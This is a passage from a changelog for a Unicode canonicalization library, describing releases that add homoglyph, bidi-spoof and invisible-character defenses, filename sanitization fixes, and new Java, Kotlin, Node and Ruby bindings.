  `disarm_inspect_anomalies` (per-finding `kind`/`token`/`start`/`end`/`detail`/`reason`,
  taking a JSON word-array lexicon so the `leet`/`segmentation` branches match the other
  bindings, not just the structural ones),
  `disarm_inspect_auto_lang` (script + chosen language + discriminators), and the
  fallible `disarm_lang_info` / `disarm_script_info` metadata lookups. JSON is the
  one transport for every nested shape (`List<List<String>>`, `List<Boolean>`,
  optionals) — no `repr(C)` mirror structs, trivially parsed by any C/Go/Swift/
  ctypes consumer. `serde_json` is a C-ABI-only dependency; the pure core still
  carries no serde. The scalar predicates (`disarm_is_suspicious_hostname`, …) are
  unchanged.
- **Whole-script-confusable signal on `HostnameAnalysis` (#545).** Two additive
  fields — `whole_script_confusable` (any label qualifies) and the per-label
  `label_whole_script_confusable` — name the fact that discriminates a whole-script
  spoof (`аррӏе.com` → skeleton `apple.com`, every letter a confusable) from a
  genuine non-Latin domain (`москва.рф`, whose `м`/`к`/`в` survive the skeleton). A
  label qualifies when it is single-script, non-Latin, and its confusable skeleton
  is entirely Latin. It is a graded **signal, not a verdict**, and is deliberately
  **not** folded into `suspicious`: on its own it fires on short non-Latin ccTLDs
  (`ру`→`py`) and on real words whose every letter is a confusable (`оса`→`oca`).
  The precise, low-false-positive policy — `whole_script_confusable(non-TLD label) ∧
  Latin TLD` — is caller-side (disarm does not model registrable boundaries). Exposed
  on the Rust and Python surfaces; the other bindings expose only `.suspicious` today
  and are tracked separately (#549).

### Documentation

- Clarified that `is_suspicious_hostname`'s `suspicious` flag is a **maximally
  conservative screen** (an any-character confusable test flags essentially every
  non-Latin hostname), not a precise verdict, and moved whole-script confusables in
  `THREAT_MODEL.md` from *out of scope* to a defined mechanism with its stated
  irreducible false-positive class. Completed the `HostnameAnalysis` field table in
  the predicates docs.
- **Upgrading guide + stability-contract clarifications (#546, #547, #548).** Added
  `docs/upgrading.md` (a new top-level nav section, distinct from *Migration*) with the
  cumulative table of public renames since 0.9 and a `!!! danger` note on the
  `is_safe_hostname` → `is_suspicious_hostname` boolean-polarity inversion. Restated
  `SECURITY.md`'s supported-version window as a self-maintaining rule (was the stale
  `0.6.x`). Extended the semver data-change clause in `docs/RUST_API.md` to name the
  security surfaces (`is_suspicious_hostname`, `normalize_confusables`, …), recorded the
  bundled Unicode/UTS#39 data versions in `docs/provenance.md` (+ provenance headers on the
  two confusables tables), and clarified that "removed in 1.0" refers to the RELEASING.md
  commercial-support milestone, not the next release.
- **Surfaced disarm's measured BitAbuse recovery in the coverage docs (#543).** Re-ran the
  adversarial-eval harness against the full corpus on v0.12.0 (325,580 rows) — `strip_obfuscation`
  now recovers **65.3%** word-level (up from 64.1% on 0.6.3) with **81.7%** of non-ASCII
  perturbation occurrences folded — and added disarm's own row to the coverage spectrum in
  `docs/security/adversarial-defense.md` and `THREAT_MODEL.md` (previously only the ~35%
  class baseline and ~96% ceiling appeared, inviting readers to transfer ~35% onto disarm).
  The word-level metric is defined inline with line-exact (5.8%) stated alongside, and the
  BitAbuse figure is explicitly separated from the near-identical TR39-space XMR = 0.634.
  Retired the divergent pre-harness baseline in the benchmark README in favour of the
  committed report, and documented a manual pre-release refresh cadence.

## [0.12.0] — 2026-08-15

### Added

- **JVM bindings — Java + Kotlin, on Maven Central (#540, closes #43).** disarm now
  ships to the JVM ecosystem: `dev.disarm:disarm` (idiomatic Java API, a fat JAR with
  per-platform JNI native libraries for macOS/Linux/Windows on x86-64 and aarch64) and
  `dev.disarm:disarm-kotlin` (extension functions + default arguments). The full core
  surface is exposed — transliteration, confusable folding, slugify / `sanitizeFilename`,
  reusable `Pipeline` and `Lexicon` handles, grapheme/script queries, and the structured
  anomaly/inspection reports. As a new binding, this is a lockstep **minor** across every
  registry (crates.io / PyPI / npm / RubyGems / Maven Central).
- **First-class C-ABI substrate (`dev.disarm` `disarm-cabi` / `disarm_ffi`).** A reusable,
  **unsafe-free** C ABI over the core (via `safer-ffi`), consumed by the JVM binding and
  the basis for the forthcoming Go bindings (#47). The JNI layer and C ABI carry no
  `unsafe` (safe handle registry, `jni_mangle`-generated exports).

### Documentation

- Documented the full set of version-bump sites a release touches (#525).

### Internal

- Routine dependency and CI-action updates (dependabot).

## [0.11.1] — 2026-07-13

### Fixed

- **`ml_normalize` is now idempotent on NFKD-exposed symbol bases (#498).** The
  `"cldr"` preset was non-idempotent on negated-relation symbols whose NFKD
  decomposition strips a combining overlay to expose a nameable base (e.g. `≇`
  U+2247 → `≅` U+2245 + U+0338 overlay). Because demojize ran before
  accent-stripping, the freshly-exposed base was only named on a *second* call,
  so `ml_normalize(x) != ml_normalize(ml_normalize(x))` across the enumerated
  17-member negated-symbol class. A second CLDR demojize pass now runs right
  after accent-stripping, so bases exposed within a call reach a true fixed
  point in a single call.
- **`normalize_confusables` is now idempotent and complete on confusable +
  combining-mark input (#523).** Confusable folding and canonical composition
  interact both ways — a fold can expose a composition (`¥`+◌̀ → `Y`+◌̀ → `Ỳ`) and
  a composition can expose a new fold (`Ҫ`+◌̧ → `Ç` → `C`, since `Ç` is itself a
  confusable) — so a single pass was not always a fixed point, and could even
  leave a residual confusable in the output. The fold/compose pass now iterates
  to a fixed point, restoring both idempotency and completeness. Guarded by a new
  exhaustive Tier-3 test over every confusable × combining-mark pair (~9M).

### Documentation

- **Documented `unidecode()` Cyrillic soft/hard-sign collisions (#511).** The
  compatibility `unidecode()` path maps the Cyrillic soft sign (ь) and hard sign
  (ъ) to the empty string, so otherwise-distinct inputs can collide; the
  limitation is now called out with a pointer to the script-aware
  `transliterate(…, lang=…)` path that preserves them.

### Internal

- **Binding publishers are gated on the published core (#500).** The npm and
  RubyGems publish jobs build their native addon/gem against `disarm` as a
  crates.io dependency, so on a release they now wait for the core crate to land
  on crates.io before building instead of racing it — removing the manual
  re-run every prior release required. No library-behavior change.
- **Held `phf`/`phf_codegen` at 0.13 to preserve MSRV 1.81 (#510).** phf 0.14
  moves to edition 2024 / Rust 1.85; a dependabot group now keeps the pair in
  lockstep and pins it below 0.14 until the MSRV is deliberately raised.

## [0.11.0] — 2026-06-21

### Performance

- **Transliterate recovers most of the form-invariance compose-at-lookup regression.**
  The #475/#477/#481 boundary added a `needs_composition` pre-scan that walked every
  non-ASCII input a second time (UTF-8 decode + `is_combining_mark` trie lookup per
  character) before transliterating, so the hot path paid two full passes where it used
  to pay one — the latin/unidecode comparator ratio fell ~18 → ~11 across #474 → #480.
  The mark/jamo detection is now fused into the engine's existing decode loop: the fast
  pass bails to the compose path only when it actually meets a combining mark, so
  mark-free input (the common case) makes a single pass. `needs_composition` (still used
  by the confusables fold) also drops the trie lookup for a range fast-path over
  U+0000–058F. Behaviour is identical (verified by the exhaustive, formal, and
  form-invariance suites); Rust-level micro-bench gains, pre → post: latin −33%,
  cyrillic −20%, mixed −21%, greek −12% ns/char.

### Added

- **Strip invisible & non-interchange code points in the security presets (#413).**
  The presets a service puts in front of an LLM, a logger, or a denylist now
  neutralize the dominant 2024–25 "ASCII smuggling" channels and the adjacent
  non-interchange classes that survive NFKC and the existing zero-width passes:
  the **Unicode Tags** block (`U+E0000`–`U+E007F`, including the previously-missed
  `U+E0001`), **variation selectors**, the **Combining Grapheme Joiner**
  (`U+034F`, a denylist-evasion blocker), **noncharacters**, and the **Private Use
  Area**; the **Braille Pattern Blank** (`U+2800`) now folds to a space rather than
  surviving as invisible padding. None of this is a blanket delete — a well-formed
  emoji **subdivision flag** (`U+1F3F4` … `U+E007F`) is preserved, and `display_clean`
  keeps the VS15/VS16 presentation selectors after a base and **preserves** the PUA
  (icon fonts), while the comparison presets (`security_clean`,
  `normalize_user_input`, `strip_obfuscation`) strip it. Four standalone helpers —
  `strip_tags`, `strip_variation_selectors`, `strip_noncharacters`, `strip_pua` —
  are exposed across the Rust core and the Python, Node, and Ruby bindings for
  composing policy directly. **Output change:** the comparison presets now remove
  these classes; idempotency is preserved (a terminal NFC recomposes any base+mark
  adjacency a strip creates).

- **Bidi-direction conflict detection (`has_bidi_conflict`, #412).** A new
  primitive that flags text mixing strong left-to-right and strong right-to-left
  characters — the precondition for Unicode Bidi display-reordering and the
  structural signal behind "BiDi Swap"-style spoofs (an LTR brand label stacked
  on an RTL domain, `varonis.com.ו.קום`). Unlike a `U+202x` override check, it
  fires on the *real letters*. Derived from disarm's own script ranges (no new
  table); exposed across the Rust core (`disarm::api::has_bidi_conflict`) and the
  Python (`has_bidi_conflict`, `Text.has_bidi_conflict`), Node (`hasBidiConflict`)
  and Ruby (`Disarm.bidi_conflict?`) bindings.
- **`HostnameAnalysis` direction fields (#412).** The Python `HostnameAnalysis`
  gains `bidi_conflict` (folded into `suspicious`), `cross_label_script` (the
  broader, non-folded cross-label fact), and `label_scripts` (per-label resolved
  scripts, left to right) for position-aware caller policy.

- **Anomaly detection: `has_anomalies` / `inspect_anomalies` (#389).** An
  out-of-place-character detector: it flags text disguising a real word via a
  cross-script homoglyph, leet, single-letter segmentation, a zero-width / bidi
  control, or zalgo, and reports a **technical fact, not intent** (like the
  hostname analysis). Built on the core's own primitives plus a caller-supplied
  common-word lexicon (used only by the leet/segmentation branches; the others are
  script-agnostic). Exposed across the Rust core (`disarm::api`) and the Python,
  Ruby, and Node bindings, with a per-language usage page. A dated **defensive
  publication** — published as prior art so the method stays freely usable.

- **Reusable anomaly lexicon handle (`Lexicon`).** The binding `has_anomalies` /
  `inspect_anomalies` functions rebuilt a hash set from the caller's word list on
  every call; a new opaque `Lexicon` class lets callers build the set **once** and
  reuse it across many calls (`disarm.Lexicon(words)` in Python, `new Lexicon(words)`
  in Node, `Disarm::Lexicon.new(words)` in Ruby). Both functions accept either the
  raw word collection (unchanged, back-compatible) or a `Lexicon`. The Rust core
  already amortizes this (it takes `&HashSet<String>`), so this closes the gap only
  the FFI bindings had.

- **Node.js docs + doc-example gate (#44).** A `docs/node/` getting-started page
  and API reference plug into the language-neutral structure (#50), with Node.js
  added to the Getting started and API Reference nav. Every Node `// =>` example
  is executed against the built addon by `scripts/check_doc_node_examples.mjs` —
  the Node analogue of the Sybil/Rust/Ruby doc gates — wired into the `node` CI
  job (which now also triggers on `docs/**`), so the examples can't rot.

- **Node.js binding (#44).** A new `bindings/node/` napi-rs addon exposes the
  pure-Rust core to Node with a fully-typed, idiomatic **TypeScript** surface —
  `camelCase` functions, options objects with sensible defaults, string-union
  token types, and a `DisarmError` / `DisarmInvalidArgument` class hierarchy. It
  covers the full plain-function surface (transliterate, confusables, slugify,
  normalization, text cleaning, graphemes, filenames, reverse/untranslatable,
  script analysis) and ships `.d.ts` types. Two layers, like the gem: a raw napi
  shim (`src/lib.rs`) under a hand-written `index.ts`. Built + vitest-tested in CI
  against the in-repo core (the #374 drift gate, now `node`/"Node checks passed"),
  with a `publish-node.yml` release workflow (per-platform prebuilds + npm
  provenance) so `npm i disarm` needs no Rust toolchain.

- **Ruby: filename, reverse-transliteration, and script-analysis ops (#375).**
  Completes the plain-function parity backfill: `sanitize_filename`
  (`platform:`/`max_length:`/`preserve_extension:`), `reverse_transliterate(lang:)`
  (`:el`/`:ru`/`:uk`), `find_untranslatable` (→ `{ char:, offset: }` hashes),
  `detect_scripts`, `mixed_script?`, and `inspect_auto_lang` (→ a
  `:script`/`:chosen_lang`/`:reason`/`:discriminators_hit` hash) — thin wrappers
  over the core `disarm::api`.

- **Ruby: grapheme-cluster operations (#375).** The binding gains `grapheme_len`,
  `grapheme_split`, `grapheme_truncate`, `grapheme_width`, and `terminal_width` —
  user-perceived-character counting/splitting/truncation and East Asian Width
  display measurement (`ambiguous_wide: false` by default), thin wrappers over the
  core `disarm::api`. Continues the Ruby↔core parity backfill (#375) and unblocks
  the graphemes Ruby docs.

- **Ruby: normalization + text-cleaning primitives (#375).** The binding gains
  `normalize` / `normalized?` (NFC/NFD/NFKC/NFKD), `collapse_whitespace`,
  `strip_control_chars`, `strip_zero_width_chars`, `strip_bidi`, and `strip_zalgo`
  / `zalgo?` — the first batch of the Ruby↔core parity backfill (#375), which
  unblocks honest normalization/text-cleaning Ruby docs. Each is a thin
  keyword-argument wrapper over the core `disarm::api`, carrying the core's
  defaults (`normalize(form: :nfc)`, `strip_zalgo(max_marks: 2)`,
  `zalgo?(threshold: 3)`).

- **CI: the Ruby binding is built and RSpec'd against the *local* core on every PR (#374).**
  A new `ruby` job in `ci.yml` compiles the gem (Ruby 3.1–3.3) and runs `rake spec`
  against the **in-repo** core — not the published one — on any PR that touches the
  binding *or the core it wraps*. It injects a CI-only `[patch.crates-io]` redirect
  so an unreleased core API change is actually exercised; the registry-core build in
  `publish-ruby.yml` is unchanged. A core change that breaks the gem (like the 0.10
  tuple→struct return that shipped a broken gem, #364–#367) now fails the new
  "Ruby checks passed" gate on the PR that introduces it, not silently at release.

- **CI: the docs' Rust and Ruby usage examples are now executed gates (#50).**
  The per-language usage tabs are no longer illustrative — each is run in CI, the
  way the Python tabs already are (Sybil). `scripts/check_doc_rust_examples.py`
  extracts every ```rust doc block, compiles and runs it against the pure core
  with `#![deny(unused_must_use)]` (so an example that discards its result fails);
  `scripts/check_doc_ruby_examples.rb` evals every Ruby `# =>` line against the
  freshly-built gem. The Rust gate runs in the `Doc tests` job; the Ruby gate runs
  in the Ruby workflow, now also triggered on `docs/**`. Catches the
  signature/output drift that the tabs introduced (which had shipped as
  non-compiling Rust until this gate).

- **Ruby: `transliterate` now accepts a `lang:` language profile.** Previously the
  Ruby binding's `transliterate` exposed only `scheme:`, so it could not reach the
  core's per-language profiles (a parity gap vs Python/Rust). `lang:` accepts a
  String or Symbol and composes with `scheme:` —
  e.g. `Disarm.transliterate("Київ", lang: :uk) # => "Kyiv"`. Implemented over the
  core's `Transliterate` builder via a generalized `_transliterate_opts` shim.

### Changed

- **Re-point Greek small letter iota `U+03B9` to the i-class, reverting #343
  (#436).** `#343` had re-pointed the bare iota from `i`/`і` to the
  `l`/vertical-bar class (`l`/`ӏ`) to unify `{ι, ӏ, ا}`. That split the iota
  family — the accented iotas `U+03AF` (ί) and `U+03CA` (ϊ) still folded to `i`
  in the same table — and was shadowed in the security presets: `security_clean`
  and `strip_obfuscation` run NFKC first, which decomposes the accented iotas to
  bare iota, so under #343 the *whole* family folded to `l` there. It also
  contradicted the upstream Unicode TR39 mapping (`03B9 → 0069`, i.e. `i`) and
  missed the dominant spoof — `normalize_confusables("bιtcoin")` returned
  `"bltcoin"` instead of colliding with `"bitcoin"`. The bare iota now folds to
  `i` (latin)/`і` (cyrillic), consistent with its accented forms, so the entire
  iota family folds to the i-class under `normalize_confusables` and the
  NFKC-first presets, and the `ι`-for-`i` spoof is caught (`bιtcoin → bitcoin`).
  The genuine full-height bars — `ӏ` (palochka `U+04CF`), `ا` (alef `U+0627`),
  and the `U+2502`/`U+FFE8` bars (#245) — stay in the l-class. The only
  confusable-table change is the single iota row in each target.

- **`security_clean` and `normalize_user_input` no longer neutralize path
  separators (#431, reverses #248).** The presets previously rewrote `/` and `\`
  to `_` and collapsed `..` runs so the output was safe to drop into a filesystem
  path. That is *sink-specific output sanitization* — out of scope for the
  canonicalization presets per [THREAT_MODEL.md](THREAT_MODEL.md) — and it
  corrupted legitimate input: URLs, file paths, and any `/`- or `\`-bearing
  string came back mangled (`"https://example.com/path"` →
  `"https:__example.com_path"`). The presets now pass separators through
  verbatim. **Upgrading:** if you fed preset output straight into a filesystem
  path, defend traversal at the sink instead — call `sanitize_filename` on the
  final path component, or validate against your own allowlist. A confusable
  fraction/division slash that NFKC folds to a real `/` is still *normalized* to
  `/` (that is canonicalization working as intended); it is just no longer
  rewritten away. The internal `neutralize_path_separators` helper is removed.

- **`collapse_whitespace` folds the full whitespace set and the blank-rendering
  code points; control/zero-width stripping is now a separate step (#433).**
  `collapse_whitespace` was category-driven and also deleted controls and
  zero-width characters inline. It now **folds whitespace only**, to a single
  space, over an explicit core-defined set: the line controls (TAB/LF/VT/FF/CR),
  the information separators (`U+001C`–`U+001F`), NEL, the `Zs`/`Zl`/`Zp` spaces,
  **and** a blank-rendering set that category detection cannot reach —
  `U+2800` Braille blank and the Hangul fillers `U+115F`/`U+1160`/`U+3164`/`U+FFA0`
  (e.g. `aㅤb` → `a b`). **Breaking:** `collapse_whitespace` drops its
  `strip_control` / `strip_zero_width` parameters (Rust, Python, Node, Ruby) — it
  no longer deletes anything. Compose `strip_control_chars` / `strip_zero_width_chars`
  before it for the old behaviour; the presets do this internally, so their output
  is unchanged except for the line-control fix below. `strip_control_chars` now
  **preserves** the whitespace controls (CR/VT/FF/NEL/`U+001C`–`U+001F`) so the
  fold can turn them into a space; it still removes NUL, DEL, and the rest of the
  C0/C1 block. The `PRESETS` metadata now lists the explicit `strip_control` /
  `strip_zero_width` steps.

- **`security_clean` now caps combining marks (anti-zalgo, #429).** The preset
  left zalgo-stacked tokens intact, so a mark-stacked `admin` did not match its
  base form in a denylist/dedup comparison `security_clean` is meant to
  canonicalize. It now caps combining marks at **2 per base** (the same threshold
  `normalize_user_input` already used), removing abusive stacking while preserving
  legitimate diacritics — `security_clean` stays accent-preserving (`café` →
  `café`, `Việt` → `Việt`; full accent folding remains in `search_key`/`sort_key`).
  The cap runs after the invisible/control strip so a stripped character between
  marks cannot split a run and hide the count (#121), and idempotency is verified
  by the raw-equality property test. **Output change:** inputs with more than two
  stacked marks per base are now capped.

- **`is_suspicious_hostname` and `has_anomalies` now flag bidi-direction
  conflicts (#412).** These detectors strengthen as disarm grows. A hostname that
  mixes strong-LTR and strong-RTL characters (the "BiDi Swap" shape, e.g.
  `varonis.com.ו.קום`) is now flagged `suspicious` via the new `bidi_conflict`
  signal — previously it slipped past `mixed_script` (which is per-label) and was
  only caught incidentally, if at all. The anomaly detector gains a `bidi_mixed`
  finding kind for a token mixing strong-LTR and strong-RTL letters: it is the
  precise, reorder-capable subset of `mixed_script` and additionally catches
  non-Latin RTL mixes (e.g. Cyrillic+Hebrew) the Latin-anchored `mixed_script`
  rule could not see. **Behaviour change:** some inputs that previously reported
  `mixed_script` (Latin+Hebrew/Arabic) now report `bidi_mixed`, and some that
  reported clean now flag. `bidi_conflict=False` / no `bidi_mixed` is not a
  safety guarantee.

- **`sort_key` now preserves base accented characters (#99.1).** `sort_key` is
  documented as a *collation* key — accented forms should stay distinct so the
  accent survives for ordering — but it shared `search_key`'s full
  transliteration pass, so it ASCII-folded every accent (`"Über"` → `"uber"`)
  and produced output identical to `search_key`. It now transliterates **only non-Latin scripts**, preserving
  Latin accents (`sort_key("Über")` → `"über"`, `sort_key("Café")` → `"café"`)
  while still folding Cyrillic/Greek/etc. to a consistent Latin form
  (`"Война и мир"` → `"voyna i mir"`). `search_key` and `catalog_key` are
  unchanged — they still fold accents for exact-match lookup and dedup. A
  language profile no longer expands an accented Latin letter in a sort key
  (`sort_key("Über", lang="de")` is `"über"`, not `"ueber"`). **Output change:**
  persisted sort keys for accented-Latin input will differ from 0.10 and should
  be regenerated. Applies across the Rust core and the Python, Ruby, and Node
  bindings.

- **Docs: synced the public XMR benchmark claims to the v2 note (#399).** The README,
  the docs landing page, the adversarial-defense page, and the unidecode-migration guide
  led with the v1 *curated-set* headline (XMR = 1.000 on the hand-curated pairs). They now
  lead with the v2 **broad-sample** measurement over the 1,314 single-codepoint TR39 sources
  whose skeleton is a single Latin letter: instance XMR **0.634 / 0.682** (95% CI) with
  **~95% per-source coverage** (stated as a distinct quantity), plus the **NFKC (0.103)** and
  **TR39-skeleton-oracle (1.000, by construction)** baselines, citing the v2 DOI
  **10.5281/zenodo.20618323**. The curated 1.000 is retained only as a labeled sanity check,
  and the curated set is described correctly (18 hand-curated Cyrillic pairs; the 19 Greek
  pairs were a separate experiment). `CITATION.cff` is bumped to `0.11.0` with the note DOI.

- **Docs: Node.js usage tabs across the guide pages (#44).** The twelve guide
  pages that carry Python/Rust/Ruby tabs now also show a runnable **Node** tab —
  38 tabs in all, matching the Ruby coverage. Every Node example is executed
  against the built addon by the doc gate (`scripts/check_doc_node_examples.mjs`).

- **Docs: completed the language-neutral restructure (#50).** The
  Adversarial-Text Defense concept page now shows Python/Rust/Ruby usage tabs (no
  bare Python), and the stale untabbed `user-guide/getting-started.md` was removed
  in favour of the per-language getting-started guides (now linked from the index
  nav). With every published binding carrying install + quickstart + API and
  `mkdocs build --strict` clean, all four #50 acceptance criteria are met.

- **Docs: Ruby usage tabs across the guide pages unblocked by the parity backfill
  (#375/#50).** The normalization, text-cleaning, graphemes, filenames, and
  language-detection guides now show a runnable **Ruby** tab beside Python and
  Rust — 17 tabs in all. Every Ruby example is executed against the built gem by
  the doc gate, so the tabs cannot rot.

- **Docs: language-neutral scaffold — first phase of the docs restructure (#50).**
  Reshaped the documentation IA toward "language-neutral concept core +
  per-language specifics": a neutral landing headline (no longer "for Python")
  that routes by ecosystem; per-language *Getting started* pages under
  `docs/python/`, `docs/rust/`, and `docs/ruby/`; a shared
  `docs/concepts/which-function.md` concept page (lifting the #328 decision
  table into the neutral layer); and an `mkdocs.yml`
  nav reorganized into *Getting started / Concepts / Guide / API Reference
  (Python · Rust) / Architecture / Migration / Reference / Project*. Folded six
  previously orphaned pages into the nav. No library behaviour change; the
  per-topic concept/usage split and per-language example tabs land in following
  phases.

- **Docs/metadata: scope `transliterate()` vs the TR39 confusable functions (#328).**
  The headline identity led with "TR39 confusable analysis", while the most
  discoverable function, `transliterate()`, performs the *opposite* mapping —
  phonetic BGN/PCGN romanization (Cyrillic `р` → `r`), not TR39 *visual*
  confusable folding (`р` → `p`). Clarified across every entry point with no
  behaviour change: the identity one-liner (README, `docs/index.md`,
  `Cargo.toml`, `pyproject.toml`, `mkdocs.yml`, `CITATION.cff`) now says
  *visual* confusable analysis and *phonetic* transliteration; a new
  "Which function do I want?" decision table sits near the top of the README and
  docs landing page; and `transliterate()`'s docstring (hence
  `docs/api/transforms.md`) and the README Quick Start block now state it is
  romanization, not homoglyph defense, pointing to `normalize_confusables()` /
  `strip_obfuscation()` for the latter.

### Deprecated

- **Presets renamed to mechanism names; old names deprecated (#430).** The three
  presets whose `*_clean` / `normalize_user_input` names overpromised safety —
  flagged as documentation defects in `THREAT_MODEL.md` — are renamed to names
  that describe their mechanism. The rename is byte-stable (`old(x) == new(x)`
  for all inputs):

  | Old name (deprecated) | New name |
  |---|---|
  | `security_clean` | `canonicalize` |
  | `display_clean` | `strip_format` |
  | `normalize_user_input` | `canonicalize_strict` |

  The old names remain as deprecated aliases across every binding — Rust (free
  functions + `DisarmStr` methods, `#[deprecated(since = "0.11.0")]`), Python
  (each emits a `DeprecationWarning`; the `Text` builder's `.security_clean()` /
  `.display_clean()` methods and the `PRESETS` keys are aliased too), Node
  (`securityClean`, `@deprecated`), and Ruby (`Disarm.security_clean`, warns with
  `category: :deprecated`). They are **removed in 1.0**. `catalog_key`,
  `search_key`, `sort_key`, `ml_normalize`, and `strip_obfuscation` are
  unchanged.

### Fixed

- **Hardening-review follow-ups (M-2, M-3, L-1, L-2).** A pass over the 2026-06-20 deep
  review closed four small correctness/perf/security gaps: (M-2) the eager
  `normalize_confusables` no longer unconditionally allocates and rebuilds the string on a
  pure-ASCII / already-folded no-op — it now delegates to the borrowing form, sharing its
  borrow-on-no-op fast path; (M-3) that borrowing form skips the `needs_composition`
  char-decode scan on pure-ASCII input via a cheap `is_ascii()` short-circuit; (L-1) the
  `Slugifier` / `UniqueSlugifier` `default=` constructor kwarg — which crosses the str→Rust
  boundary in `__init__`, outside the `@_surrogate_safe`-guarded `__call__` — is now
  WTF-8→UTF-8 scrubbed, so a lone-surrogate default no longer raises `UnicodeEncodeError`
  (closing the last gap in the #476 contract); (L-2) the fast-path guard's `Confusables`
  step now sets its `marks` bit itself rather than relying on a preceding `Nfkc` step, so a
  hypothetical `Confusables`-only preset can't let the guard skip a decomposed homoglyph the
  fold would recover. Per-cluster allocation in `compose.rs` (L-6) is also removed via a
  reused NFC scratch buffer, and a stale generator comment claiming U+0344 is "unmapped" is
  corrected (it maps to the empty string, so its output-neutral row is emitted, not skipped).
- **`normalize_confusables` is idempotent on an excluded singleton followed by an
  unrelated mark.** The compose-at-lookup pass (#481) recovered a composition-excluded
  precomposed singleton (`ড়` U+09DC = ড + nukta) only by a whole-cluster widening-map
  lookup. When such a singleton was followed by an *unrelated* combining mark (a visarga),
  the cluster's `.nfc()` decomposed the singleton (`ড় ◌ঃ` → ড nukta visarga) and the
  trailing mark made the lookup miss the 2-char `ড nukta` key — so it stayed decomposed.
  The fold then oscillated (a bare `ড়` composes, `ড় + mark` decomposes), i.e.
  `nc(nc(x)) != nc(x)`, surfaced by a `normalize_confusables_idempotent` proptest seed.
  The lookup now matches the widening map by **greedy longest prefix** at each position in
  the cluster (bounded by a build-time-emitted `EXCLUDED_COMPOSITIONS_MAX_KEY_CHARS`), so
  the excluded head recomposes and any trailing marks are kept — idempotent and
  form-invariant. The mark-free hot path and the common single-mark cluster are unchanged.
- **`sanitize_filename` never returns an empty name or a `.` / `..` directory reference;
  leading/trailing dot hygiene (#485, #487).** Three correctness gaps with one root: the
  extension branch re-prepended `'.'` and was exempt from the stem's dot trim. (1) The
  empty string bypassed the never-empty fallback and returned `""` — `os.path.join(dir,
  "")` targets the directory, a write-target footgun. (2) Trailing dots/spaces survived
  (`"report..."` -> `"report."`, `"CON."` -> `"_CON."`), which Windows then silently
  strips at the filesystem layer. (3) A separator-then-dot-like input reduced to a bare
  `"."` (`"_" + U+00B7` -> `"."`), a current-directory reference. A shared `finalize_name`
  now runs on the fully assembled name: it trims leading and trailing dots and spaces, and
  falls back to `"_"` for an empty, `"."`, or `".."` result — so the output is always
  non-empty, never a directory reference, and never a leading/trailing-dot dotfile, across
  both return paths. A 50-case attacker battery (path traversal, Unicode separator
  homoglyphs, control/NUL, RTLO/bidi, the ADS colon, dot hygiene, the separator-plus-dot
  class) and non-emptiness/idempotency property tests lock the defenses in. (A separate
  idempotency gap from the extension-split boundary moving between passes is tracked in
  #488.)
- **Class-based entrypoints honor the malformed-Unicode (surrogate) contract (#476).**
  The #469 boundary adapter wrapped every module-level `_core` callable, but the
  **class** entrypoints that cross the `str` → Rust boundary on construction or in a
  method were not covered: `Lexicon(["a\ud83d…"])` raised `UnicodeEncodeError`, and so
  did calling a `Slugifier` / `UniqueSlugifier` / `TextPipeline` on surrogate-laced text.
  They now apply the same WTF-8 → UTF-8 scrub-and-retry: the three callable classes guard
  their `__call__`, and `Lexicon` (a `frozen`, non-subclassable PyO3 class) is guarded by
  a metaclass proxy whose construction scrubs while `isinstance` still recognizes every
  real handle, so the `has_anomalies` / `inspect_anomalies` prebuilt-handle dispatch is
  unaffected. The dynamic surrogate audit is extended to enumerate the exported classes
  (covered or reviewed-exempt), so a future class with a text surface fails the audit
  rather than silently skipping the contract.

- **Hangul romanization is invariant to the input's normal form (#483).** A precomposed
  syllable run was romanized with inter-syllable spaces (`처리` → `"cheo ri"`), but the
  same text decomposed to conjoining jamo (NFD) romanized contiguously (`"cheori"`), so
  the output depended on the normal form. Conjoining jamo are `General_Category=Lo`, so
  #479's `General_Category=Mark` compose-at-lookup gate never fired on them. The fix
  composes an `L + V [+ T]` jamo run into its syllable by the standard Unicode index
  arithmetic (no table, no normalization pass), gated on a cheap jamo range check, as a
  sibling to the existing mark-composition path — so the decomposed form takes the same
  per-code-point path as the precomposed one. `transliterate`, `slugify`, `unidecode`,
  and `slugify_unicode` now agree across NFC/NFD/NFKD on Hangul; the precomposed output
  (`"cheo ri"`) is unchanged. Partial jamo (a lone L, or `L + T` with no vowel) are left
  alone. Cosmetic spacing only — both forms always recovered the same Korean reading;
  this was the last NFC/NFD gap on the transliterate path.

- **Close the raw-vs-normalized residual the #477 oracle could not see (#481).** The
  form-invariance audit compared the normal forms against each other but never against
  the *raw* precomposed input, so a composition-**excluded** code point passed green
  while still degrading: Devanagari `क़` U+0958 transliterated `"qa"` raw, but its
  canonical decomposition KA + nukta is composition-excluded, so every normal form
  degraded to `"ka"` (the mark dropped). Closed entirely with **build-time data, no
  runtime canonicalization pass** (so the #478 decompose-then-recompose regression class
  cannot recur): an *exclusion-inclusive* compose map widens #479's compose-at-lookup so
  a base+mark exclusion reaches its precomposed scalar (KA+nukta → QA, shin+sin-dot →
  `שׂ` U+FB2B, Tibetan vowel stacks, the Hebrew presentation forms), and the two real
  Greek-oxia confusable singletons (U+1F77/U+1F79 → `i`/`o`) become char-table rows. The
  map is gated on the precomposed target being mapped, which keeps an unmapped operator
  (FORKING U+2ADC = NONFORKING + U+0338) from cycling with the NFKC recovery. The audit
  now asserts `f(raw) == f(NFC) == f(NFD) == f(NFKD)` for the transliterate family and
  confusable detection, with a small characterized tail (two Greek accent-punctuation
  code points, and the benign spoof-resolutions where normalizing a look-alike to its
  genuine character — Kelvin U+212A → `K` — flips detection). The ~1,027 non-target
  singletons (`ά` U+1F71 vs U+03AC, the same Greek letter, neither a Latin confusable)
  are deliberately left as benign re-encoding: `normalize_confusables` is a targeted
  fold, not a normalizer.

- **Confusable folding, detection, and transliteration are invariant to the input's
  normal form (#475, #477).** The confusables maps and the transliteration tables are
  keyed per code point on the *precomposed* form (`ї` U+0457 → `i` / `yi`), so a
  *decomposed* input (`і` U+0456 + combining diaeresis U+0308) reached only the base
  entry and the mark survived — an attacker could evade the recovery, or flip
  `is_confusable`, just by sending NFD. The confusables fold and detect
  (`normalize_confusables`, `is_confusable`) and every public `str → str` recovery
  entrypoint — `transliterate`, `unidecode`, and the whole `slugify*` family (including
  the Unicode-preserving `slugify_unicode`) — now compose each base + combining-mark
  cluster at lookup time, so the result is invariant to the input's normal form
  (`f(NFC(x)) == f(NFD(x)) == f(NFKD(x))`, and likewise for the `is_confusable`
  predicate). The composition is **compose-only** (it never *decomposes*): a
  composition-excluded presentation form such as Hebrew `שׂ` U+FB2B keeps its own table
